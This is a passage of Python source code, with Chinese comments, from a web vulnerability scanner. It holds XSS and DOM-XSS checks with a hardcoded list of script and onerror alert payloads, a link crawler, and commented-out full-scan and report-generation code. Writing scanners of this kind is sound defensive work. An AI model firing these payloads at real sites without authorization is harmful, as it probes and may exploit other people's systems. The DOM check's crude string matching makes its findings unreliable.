            print(f"  置信度: {vuln['confidence']}")
            print(f"  详情: {vuln['details']}")
        
        print(f"\n{'='*60}")
        print(f"扫描完成！共发现 {len(vulnerabilities)} 个XSS漏洞")
        
        # 更新扫描结果
        self.results['vulnerabilities'].extend(vulnerabilities)
        
        return vulnerabilities, self.results

    def check_dom_xss(self, url_input):
        """DOM型XSS检测（需要JavaScript执行环境，这里为基础检测）"""
        print("\n[*] 开始DOM型XSS检测...")
        
        vulnerabilities = []
        
        # DOM XSS相关payload
        dom_payloads = [
            "#<script>alert('DOM XSS')</script>",
            "#javascript:alert('DOM XSS')",
            "?param=123#<img src=x onerror=alert(1)>",
            "?returnUrl=javascript:alert('XSS')",
            "?callback=alert('XSS')"
        ]
        
        if isinstance(url_input, str):
            urls = [url_input]
        elif isinstance(url_input, list):
            urls = url_input
        else:
            raise TypeError(f"url_input必须是字符串或列表，但得到{type(url_input)}")
        
        for url in urls:
            for payload in dom_payloads:
                try:
                    # 构建测试URL
                    if payload.startswith('#'):
                        test_url = f"{url}{payload}"
                    elif payload.startswith('?'):
                        test_url = f"{url}{payload}"
                    else:
                        test_url = f"{url}?{payload}"
                    
                    request_info = {
                        'method': 'GET',
                        'url': test_url,
                        'headers': {}
                    }
                    
                    response = self.send_controlled_request(request_info)
                    
                    if response:
                        # 检查响应中是否有JavaScript处理痕迹
                        response_text = response.get('response', {}).get('text', '')
                        
                        # 查找可能的DOM操作
                        dom_indicators = [
                            'document.write',
                            'innerHTML',
                            'eval(',
                            'setTimeout',
                            'location.hash',
                            'window.location'
                        ]
                        
                        for indicator in dom_indicators:
                            if indicator in response_text:
                                vulnerabilities.append({
                                    "url": url,
                                    "type": "可能的DOM型XSS",
                                    "payload": payload,
                                    "confidence": "低",
                                    "details": f"发现DOM操作函数: {indicator}",
                                    "tested_url": test_url
                                })
                                print(f"  [!] 发现可能的DOM XSS漏洞，使用了 {indicator}")
                                break
                
                except Exception as e:
                    print(f"  [-] DOM XSS测试出错: {e}")
        
        # 更新扫描结果
        self.results['vulnerabilities'].extend(vulnerabilities)
        
        return vulnerabilities, self.results

    # ==================== 爬虫功能 ====================
    def crawl_links(self, url_input):
        """爬取页面中的链接"""
        # 统一处理输入：将单个URL转换为列表
        if isinstance(url_input, str):
            urls = [url_input]
        elif isinstance(url_input, list):
            urls = url_input
        else:
            raise TypeError(f"url_input 必须是字符串或列表，但得到 {type(url_input)}")

        all_links = []
        
        for url in urls:
            # 确保URL是字符串
            if not isinstance(url, str):
                print(f"跳过非字符串URL: {url}")
                continue
            
            print(f"\n开始爬取URL: {url}")
            try:
                request_info = {
                    'method': 'GET',
                    'url': url,
                    'headers': {}
                }
                
                response = self.send_controlled_request(request_info)
                
                # 检查响应是否为None（请求失败）
                if response is None:
                    print(f"请求失败，响应为None: {url}")
                    continue
                
                # 检查解析的内容是否存在
                if 'parsed' not in response:
                    print(f"响应中没有parsed字段: {url}")
                    continue
                    
                body = response['parsed'].get('parsed_content', '') if isinstance(response['parsed'], dict) else str(response['parsed'])
                
                soup = BeautifulSoup(str(body), "html.parser")
                
                # 解析基础URL的域名
                base_domain = urlparse(url).netloc
                links = []
                
                try:
                    if soup:
                        for link in soup.find_all("a", href=True):
                            href = link['href']
                            # 解析链接的域名
                            absolute_url = urljoin(url, href)
                            link_domain = urlparse(absolute_url).netloc                
                            # 只爬取同域名链接（忽略协议差异）
                            if link_domain == base_domain:
                                links.append(absolute_url)
                        all_links.extend(links)
                        print(f"从 {url} 爬取到 {len(links)} 个链接")
                except Exception as e:
                    print(f"解析页面失败: {url}, 错误: {e}")
            except Exception as e:
                print(f"爬取链接失败: {url}, 错误: {e}")
        
        # 去重
        unique_links = list(set(all_links))
        print(f"\n总共爬取到 {len(unique_links)} 个唯一链接")
        
        return unique_links

#     # ==================== 全面扫描功能 ====================
#     def full_scan(self, url_input, scan_types=None):
#         """
#         全面的Web安全扫描
#         Args:
#             url_input: 单个URL字符串或URL列表
#             scan_types: 扫描类型列表 ['sql', 'xss', 'crawl']
#         Returns:
#             dict: 扫描结果
#         """
#         if scan_types is None:
#             scan_types = ['crawl', 'sql', 'xss']
        
#         print(f"\n{'='*60}")
#         print("开始全面Web安全扫描")
#         print(f"扫描类型: {scan_types}")
#         print(f"{'='*60}")
        
#         # 统一处理输入：将单个URL转换为列表
#         if isinstance(url_input, str):
#             urls = [url_input]
#         elif isinstance(url_input, list):
#             urls = url_input
#         else:
#             raise TypeError(f"url_input必须是字符串或列表，但得到{type(url_input)}")
        
#         scan_start_time = time.time()
        
#         # 爬虫阶段
#         crawled_urls = []
#         if 'crawl' in scan_types:
#             print("\n[阶段1] 网站爬取...")
#             for url in urls:
#                 print(f"爬取: {url}")
#                 links = self.crawl_links(url)
#                 crawled_urls.extend(links)
            
#             # 去重并添加原始URL
#             all_urls = list(set(urls + crawled_urls))
#             print(f"\n✅ 总共发现 {len(all_urls)} 个唯一URL")
#         else:
#             all_urls = urls
        
#         # SQL注入扫描
#         sql_vulnerabilities = []
#         if 'sql' in scan_types:
#             print("\n[阶段2] SQL注入扫描...")
#             for url in all_urls:
#                 print(f"\n扫描: {url}")
                
#                 # 解析URL参数
#                 parsed = urlparse(url)
#                 query_params = parse_qs(parsed.query)
                
#                 if query_params:
#                     # 对每个参数进行SQL注入检测
#                     for param_name, values in query_params.items():
#                         if values:
#                             try:
#                                 print(f"  测试参数: {param_name}")
#                                 result, details = self.check_sql_injection(
#                                     url=url,
#                                     param_name=param_name,
#                                     param_value=values[0],
#                                     method="GET"
#                                 )
                                
#                                 if result and result.get('vulnerable'):
#                                     print(f"  ⚠️  发现SQL注入漏洞！可信度: {result.get('confidence', 'N/A')}")
#                                     sql_vulnerabilities.extend(details)
#                             except Exception as e:
#                                 print(f"  参数 {param_name} 扫描出错: {e}")
#                 else:
#                     # 如果没有参数，使用默认参数测试
#                     try:
#                         result, details = self.check_sql_injection(
#                             url=url,
#                             param_name="id",
#                             param_value="1",
#                             method="GET"
#                         )
                        
#                         if result and result.get('vulnerable'):
#                             print(f"  ⚠️  发现SQL注入漏洞！可信度: {result.get('confidence', 'N/A')}")
#                             sql_vulnerabilities.extend(details)
#                     except Exception as e:
#                         print(f"  默认参数扫描出错: {e}")
        
#         # XSS扫描
#         xss_vulnerabilities = []
#         if 'xss' in scan_types:
#             print("\n[阶段3] XSS漏洞扫描...")
#             for url in all_urls:
#                 print(f"\n扫描: {url}")
#                 try:
#                     vulns, _ = self.check_xss(url, method='GET')
#                     xss_vulnerabilities.extend(vulns)
#                 except Exception as e:
#                     print(f"  XSS扫描出错: {e}")
        
#         # DOM XSS扫描
#         dom_xss_vulnerabilities = []
#         if 'xss' in scan_types:
#             print("\n[阶段4] DOM型XSS扫描...")
#             for url in all_urls:
#                 try:
#                     vulns, _ = self.check_dom_xss(url)
#                     dom_xss_vulnerabilities.extend(vulns)
#                 except Exception as e:
#                     print(f"  DOM XSS扫描出错: {e}")
        
#         # 合并所有漏洞
#         all_vulnerabilities = sql_vulnerabilities + xss_vulnerabilities + dom_xss_vulnerabilities
        
#         # 计算扫描时间
#         scan_time = time.time() - scan_start_time
        
#         # 生成最终报告
#         report = self._generate_comprehensive_report(
#             all_urls=all_urls,
#             sql_vulnerabilities=sql_vulnerabilities,
#             xss_vulnerabilities=xss_vulnerabilities,
#             dom_xss_vulnerabilities=dom_xss_vulnerabilities,
#             scan_time=scan_time
#         )
        
#         print(f"\n{'='*60}")
#         print("全面扫描完成！")
#         print(f"扫描URL数量: {len(all_urls)}")
#         print(f"发现漏洞总数: {len(all_vulnerabilities)}")
#         print(f"扫描耗时: {scan_time:.2f}秒")
#         print(f"{'='*60}")
        
#         return report

#     def _generate_comprehensive_report(self, all_urls, sql_vulnerabilities, 
#                                      xss_vulnerabilities, dom_xss_vulnerabilities, scan_time):
#         """生成全面扫描报告"""
#         report = {
#             'scan_summary': {
#                 'total_urls_scanned': len(all_urls),
#                 'scan_duration_seconds': round(scan_time, 2),
#                 'scan_timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
#                 'total_vulnerabilities': len(sql_vulnerabilities) + len(xss_vulnerabilities) + len(dom_xss_vulnerabilities)
#             },
#             'sql_injection': {
#                 'total_found': len(sql_vulnerabilities),
#                 'vulnerabilities': sql_vulnerabilities,
#                 'statistics': self.results.get('sql_statistics', {})
#             },
#             'xss': {
#                 'total_found': len(xss_vulnerabilities),
#                 'vulnerabilities': xss_vulnerabilities,
#                 'dom_xss_found': len(dom_xss_vulnerabilities),
#                 'dom_xss_vulnerabilities': dom_xss_vulnerabilities
#             },
#             'scan_details': {
#                 'scanned_urls': all_urls,
#                 'request_statistics': self.results.get('statistics', {}),
#                 'configuration_used': {
#                     'sql_config_file': 'sql_injection.json',
#                     'time_based_threshold': self.sql_thresholds['time_based_threshold'],
#                     'xss_payloads_count': len(self.xss_payloads)
#                 }
#             }
#         }
        
#         # 按漏洞类型分类
#         vulnerability_types = {}
#         for vuln in sql_vulnerabilities + xss_vulnerabilities + dom_xss_vulnerabilities:
#             vuln_type = vuln.get('type', 'Unknown')
#             if vuln_type not in vulnerability_types:
#                 vulnerability_types[vuln_type] = []
#             vulnerability_types[vuln_type].append(vuln)
        
#         report['vulnerability_types'] = vulnerability_types
        
#         # 按风险等级分类
#         risk_levels = {
#             'critical': [],
#             'high': [],
#             'medium': [],
#             'low': [],
#             'informational': []
#         }
        
#         for vuln in sql_vulnerabilities + xss_vulnerabilities + dom_xss_vulnerabilities:
#             confidence = vuln.get('confidence', '').lower()
#             vuln_type = vuln.get('type', '')
            
#             # 根据漏洞类型和置信度确定风险等级
#             if 'sql' in vuln_type.lower():
#                 if 'high' in confidence or confidence == '高':
#                     risk_levels['critical'].append(vuln)
#                 elif 'medium' in confidence or confidence == '中':
#                     risk_levels['high'].append(vuln)
#                 else:
#                     risk_levels['medium'].append(vuln)
#             elif 'xss' in vuln_type.lower():
#                 if 'high' in confidence or confidence == '高':
#                     risk_levels['high'].append(vuln)
#                 elif 'medium' in confidence or confidence == '中':
#                     risk_levels['medium'].append(vuln)
#                 else:
#                     risk_levels['low'].append(vuln)
#             else:
#                 risk_levels['informational'].append(vuln)
        
#         report['risk_levels'] = risk_levels
        
#         return report

#     # ==================== 报告生成 ====================
#     def generate_report(self, report_data=None, filename=None, format='json'):
#         """生成检测报告"""
#         if report_data is None:
#             # 如果没有提供报告数据，使用扫描器结果
#             report_data = self._generate_comprehensive_report(
#                 all_urls=[],
#                 sql_vulnerabilities=[],
#                 xss_vulnerabilities=[],
#                 dom_xss_vulnerabilities=[],
#                 scan_time=0
#             )
        
#         timestamp = time.strftime("%Y%m%d_%H%M%S")
#         if not filename:
#             filename = f"web_security_scan_report_{timestamp}.{format}"
        
#         try:
#             if format.lower() == 'json':
#                 with open(filename, 'w', encoding='utf-8') as f:
#                     json.dump(report_data, f, indent=2, ensure_ascii=False)
#                 print(f"✅ JSON报告已保存到: {filename}")
                
#             elif format.lower() == 'txt':
#                 with open(filename, 'w', encoding='utf-8') as f:
#                     f.write(self._format_text_report(report_data))
#                 print(f"✅ 文本报告已保存到: {filename}")
                
#             elif format.lower() == 'html':
#                 html_content = self._format_html_report(report_data)
#                 with open(filename, 'w', encoding='utf-8') as f:
#                     f.write(html_content)
#                 print(f"✅ HTML报告已保存到: {filename}")
                
#             else:
#                 print(f"❌ 不支持的格式: {format}")
#                 return None
            
#             return filename
            
#         except Exception as e:
#             print(f"❌ 保存报告失败: {e}")
#             return None

#     def _format_text_report(self, report_data):
#         """格式化文本报告"""
#         lines = []
#         lines.append("=" * 80)
#         lines.append("WEB安全扫描报告")
#         lines.append("=" * 80)
        
#         # 扫描摘要
#         summary = report_data.get('scan_summary', {})
#         lines.append(f"\n扫描摘要:")
#         lines.append(f"  扫描时间: {summary.get('scan_timestamp', 'N/A')}")
#         lines.append(f"  扫描URL数量: {summary.get('total_urls_scanned', 0)}")
#         lines.append(f"  发现漏洞总数: {summary.get('total_vulnerabilities', 0)}")
#         lines.append(f"  扫描耗时: {summary.get('scan_duration_seconds', 0)}秒")
        
#         # SQL注入漏洞
#         sql_data = report_data.get('sql_injection', {})
#         lines.append(f"\nSQL注入漏洞 ({sql_data.get('total_found', 0)}个):")
#         for i, vuln in enumerate(sql_data.get('vulnerabilities', []), 1):
#             lines.append(f"\n  {i}. {vuln.get('type', 'Unknown')}")
#             lines.append(f"     参数: {vuln.get('parameter', 'N/A')}")
#             lines.append(f"     Payload: {vuln.get('payload', 'N/A')[:50]}...")
#             lines.append(f"     置信度: {vuln.get('confidence', 'N/A')}")
#             lines.append(f"     数据库: {vuln.get('database', 'N/A')}")
        
#         # XSS漏洞
#         xss_data = report_data.get('xss', {})
#         lines.append(f"\nXSS漏洞 ({xss_data.get('total_found', 0)}个):")
#         for i, vuln in enumerate(xss_data.get('vulnerabilities', []), 1):
#             lines.append(f"\n  {i}. {vuln.get('type', 'Unknown')}")
#             lines.append(f"     参数: {vuln.get('parameter', 'N/A')}")
#             lines.append(f"     Payload: {vuln.get('payload', 'N/A')[:50]}...")
#             lines.append(f"     置信度: {vuln.get('confidence', 'N/A')}")
        
#         # DOM XSS漏洞
#         dom_xss_count = xss_data.get('dom_xss_found', 0)
#         lines.append(f"\nDOM型XSS漏洞 ({dom_xss_count}个):")
#         for i, vuln in enumerate(xss_data.get('dom_xss_vulnerabilities', []), 1):
#             lines.append(f"\n  {i}. {vuln.get('type', 'Unknown')}")
#             lines.append(f"     Payload: {vuln.get('payload', 'N/A')}")
#             lines.append(f"     置信度: {vuln.get('confidence', 'N/A')}")
        
#         # 风险等级统计
#         risk_levels = report_data.get('risk_levels', {})
#         lines.append(f"\n风险等级统计:")
#         for level, vulns in risk_levels.items():
#             if vulns:
#                 lines.append(f"  {level.upper()}: {len(vulns)}个")
        
#         lines.append("\n" + "=" * 80)
#         lines.append("报告生成完成")
#         lines.append("=" * 80)
        
#         return "\n".join(lines)

#     def _format_html_report(self, report_data):
#         """格式化HTML报告"""
#         html = '''<!DOCTYPE html>
# <html lang="zh-CN">
# <head>
#     <meta charset="UTF-8">
#     <meta name="viewport" content="width=device-width, initial-scale=1.0">
#     <title>Web安全扫描报告</title>
#     <style>
#         body { font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }
#         .container { max-width: 1200px; margin: 0 auto; background-color: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
#         .header { text-align: center; border-bottom: 2px solid #333; padding-bottom: 20px; margin-bottom: 30px; }
#         .section { margin-bottom: 30px; padding: 20px; border: 1px solid #ddd; border-radius: 5px; }
#         .section-title { font-size: 1.5em; font-weight: bold; margin-bottom: 15px; color: #333; border-bottom: 1px solid #eee; padding-bottom: 10px; }
#         .vulnerability { background-color: #f9f9f9; padding: 15px; margin-bottom: 15px; border-left: 4px solid #e74c3c; border-radius: 3px; }
#         .vuln-title { font-weight: bold; color: #e74c3c; margin-bottom: 10px; }
#         .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
#         .stat-box { background-color: #3498db; color: white; padding: 15px; border-radius: 5px; text-align: center; }
#         .stat-value { font-size: 2em; font-weight: bold; }
#         .stat-label { font-size: 0.9em; opacity: 0.9; }
#         .risk-high { border-left-color: #e74c3c; }
#         .risk-medium { border-left-color: #f39c12; }
#         .risk-low { border-left-color: #f1c40f; }
#         .risk-info { border-left-color: #3498db; }
#         table { width: 100%; border-collapse: collapse; margin-top: 10px; }
#         th, td { padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }
#         th { background-color: #f2f2f2; }
#     </style>
# </head>
# <body>
#     <div class="container">
#         <div class="header">
#             <h1>Web安全扫描报告</h1>
#             <p>生成时间: ''' + report_data.get('scan_summary', {}).get('scan_timestamp', 'N/A') + '''</p>
#         </div>
        
#         <div class="stats">
#             <div class="stat-box">
#                 <div class="stat-value">''' + str(report_data.get('scan_summary', {}).get('total_urls_scanned', 0)) + '''</div>
#                 <div class="stat-label">扫描URL数量</div>
#             </div>
#             <div class="stat-box">
#                 <div class="stat-value">''' + str(report_data.get('scan_summary', {}).get('total_vulnerabilities', 0)) + '''</div>
#                 <div class="stat-label">发现漏洞总数</div>
#             </div>
#             <div class="stat-box">
#                 <div class="stat-value">''' + str(report_data.get('sql_injection', {}).get('total_found', 0)) + '''</div>
#                 <div class="stat-label">SQL注入漏洞</div>
#             </div>
#             <div class="stat-box">
#                 <div class="stat-value">''' + str(report_data.get('xss', {}).get('total_found', 0)) + '''</div>
#                 <div class="stat-label">XSS漏洞</div>
#             </div>
#         </div>
        
#         <div class="section">
#             <div class="section-title">扫描摘要</div>
#             <table>
#                 <tr><th>项目</th><th>值</th></tr>
#                 <tr><td>扫描时间</td><td>''' + report_data.get('scan_summary', {}).get('scan_timestamp', 'N/A') + '''</td></tr>
#                 <tr><td>扫描URL数量</td><td>''' + str(report_data.get('scan_summary', {}).get('total_urls_scanned', 0)) + '''</td></tr>
#                 <tr><td>发现漏洞总数</td><td>''' + str(report_data.get('scan_summary', {}).get('total_vulnerabilities', 0)) + '''</td></tr>
#                 <tr><td>扫描耗时</td><td>''' + str(report_data.get('scan_summary', {}).get('scan_duration_seconds', 0)) + '''秒</td></tr>
#             </table>
#         </div>'''
        
#         # SQL注入部分
#         sql_data = report_data.get('sql_injection', {})
#         if sql_data.get('vulnerabilities'):
#             html += '''
#         <div class="section">
#             <div class="section-title">SQL注入漏洞 (''' + str(sql_data.get('total_found', 0)) + '''个)</div>'''
            
#             for i, vuln in enumerate(sql_data.get('vulnerabilities', []), 1):
#                 risk_class = "risk-high" if "high" in str(vuln.get('confidence', '')).lower() or vuln.get('confidence') == "高" else "risk-medium"
#                 html += '''
#             <div class="vulnerability ''' + risk_class + '''">
#                 <div class="vuln-title">''' + str(i) + '. ' + vuln.get('type', 'Unknown') + '''</div>
#                 <p><strong>参数:</strong> ''' + vuln.get('parameter', 'N/A') + '''</p>
#                 <p><strong>Payload:</strong> <code>''' + vuln.get('payload', 'N/A')[:100] + '''</code></p>
#                 <p><strong>置信度:</strong> ''' + vuln.get('confidence', 'N/A') + '''</p>
#                 <p><strong>数据库:</strong> ''' + vuln.get('database', 'N/A') + '''</p>
#             </div>'''
            
#             html += '''
#         </div>'''
        
#         # XSS部分
#         xss_data = report_data.get('xss', {})
#         if xss_data.get('vulnerabilities'):
#             html += '''
#         <div class="section">
#             <div class="section-title">XSS漏洞 (''' + str(xss_data.get('total_found', 0)) + '''个)</div>'''
            
#             for i, vuln in enumerate(xss_data.get('vulnerabilities', []), 1):
#                 confidence = vuln.get('confidence', '')
#                 if confidence == "高":
#                     risk_class = "risk-high"
#                 elif confidence == "中":
#                     risk_class = "risk-medium"
#                 else:
#                     risk_class = "risk-low"
                    
#                 html += '''
#             <div class="vulnerability ''' + risk_class + '''">
#                 <div class="vuln-title">''' + str(i) + '. ' + vuln.get('type', 'Unknown') + '''</div>
#                 <p><strong>参数:</strong> ''' + vuln.get('parameter', 'N/A') + '''</p>
#                 <p><strong>Payload:</strong> <code>''' + vuln.get('payload', 'N/A')[:100] + '''</code></p>
#                 <p><strong>置信度:</strong> ''' + vuln.get('confidence', 'N/A') + '''</p>
#                 <p><strong>详情:</strong> ''' + vuln.get('details', 'N/A') + '''</p>
#             </div>'''
            
#             html += '''
#         </div>'''
        
#         # DOM XSS部分
#         dom_xss_vulns = xss_data.get('dom_xss_vulnerabilities', [])
#         if dom_xss_vulns:
#             html += '''
#         <div class="section">
#             <div class="section-title">DOM型XSS漏洞 (''' + str(len(dom_xss_vulns)) + '''个)</div>'''
            
#             for i, vuln in enumerate(dom_xss_vulns, 1):
#                 html += '''
#             <div class="vulnerability risk-info">
#                 <div class="vuln-title">''' + str(i) + '. ' + vuln.get('type', 'Unknown') + '''</div>
#                 <p><strong>Payload:</strong> <code>''' + vuln.get('payload', 'N/A') + '''</code></p>
#                 <p><strong>置信度:</strong> ''' + vuln.get('confidence', 'N/A') + '''</p>
#                 <p><strong>详情:</strong> ''' + vuln.get('details', 'N/A') + '''</p>
#             </div>'''
            
#             html += '''
#         </div>'''
        
#         # 风险等级统计
#         risk_levels = report_data.get('risk_levels', {})
#         if any(risk_levels.values()):
#             html += '''
#         <div class="section">
#             <div class="section-title">风险等级统计</div>
#             <table>
#                 <tr><th>风险等级</th><th>数量</th></tr>'''
            
#             for level, vulns in risk_levels.items():
#                 if vulns:
#                     html += '''
#                 <tr><td>''' + level.upper() + '''</td><td>''' + str(len(vulns)) + '''</td></tr>'''
            
#             html += '''
#             </table>
#         </div>'''
        
#         html += '''
#         <div class="section">
#             <div class="section-title">报告信息</div>
#             <p>本报告由AdvancedWebScanner自动生成。</p>
#             <p>扫描配置: SQL注入配置文件 - sql_injection.json</p>
#             <p>XSS Payload数量: ''' + str(len(self.xss_payloads)) + '''</p>
#             <p>时间盲注阈值: ''' + str(self.sql_thresholds['time_based_threshold']) + '''秒</p>
#         </div>
#     </div>
# </body>
# </html>'''
        
#         return html

#     # ==================== 工具方法 ====================
#     def get_payload_statistics(self):
#         """获取payload统计信息"""
#         stats = {
#             "total_xss_payloads": len(self.xss_payloads),
#             "sql_payloads_by_type": {k: len(v) for k, v in self.sql_payloads.items()},
#             "sql_error_indicators": sum(len(v) for v in self.sql_config.get("error_indicators", {}).values()),
#             "time_based_threshold": self.sql_thresholds['time_based_threshold']
#         }
#         return stats

#     def reset_results(self):
#         """重置扫描结果"""
#         self.results = {
#             "requests": [],
#             "responses": [],
#             "statistics": {},
#             'vulnerabilities': [],
#             'sql_statistics': {
#                 "total_tested": 0,
#                 "vulnerable_urls": 0,
#                 "by_type": {},
#                 "by_database": {},
#                 "by_method": {}
#             }
#         }
#         self.baseline_responses = {}
#         print("✅ 扫描结果已重置")

#     def save_state(self, filename=None):
#         """保存扫描器状态"""
#         if not filename:
#             timestamp = time.strftime("%Y%m%d_%H%M%S")
#             filename = f"scanner_state_{timestamp}.json"
        
#         state = {
#             'results': self.results,
#             'baseline_responses': self.baseline_responses,
#             'sql_thresholds': self.sql_thresholds,
#             'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
#         }
        
#         try:
#             with open(filename, 'w', encoding='utf-8') as f:
#                 json.dump(state, f, indent=2, ensure_ascii=False)
#             print(f"✅ 状态已保存到: {filename}")
#             return filename
#         except Exception as e:
#             print(f"❌ 保存状态失败: {e}")
#             return None

#     def load_state(self, filename):
#         """加载扫描器状态"""
#         try:
#             with open(filename, 'r', encoding='utf-8') as f:
#                 state = json.load(f)
            
#             self.results = state.get('results', self.results)
#             self.baseline_responses = state.get('baseline_responses', {})
#             print(f"✅ 状态已从 {filename} 加载")
#             return True
#         except Exception as e:
#             print(f"❌ 加载状态失败: {e}")
#             return False
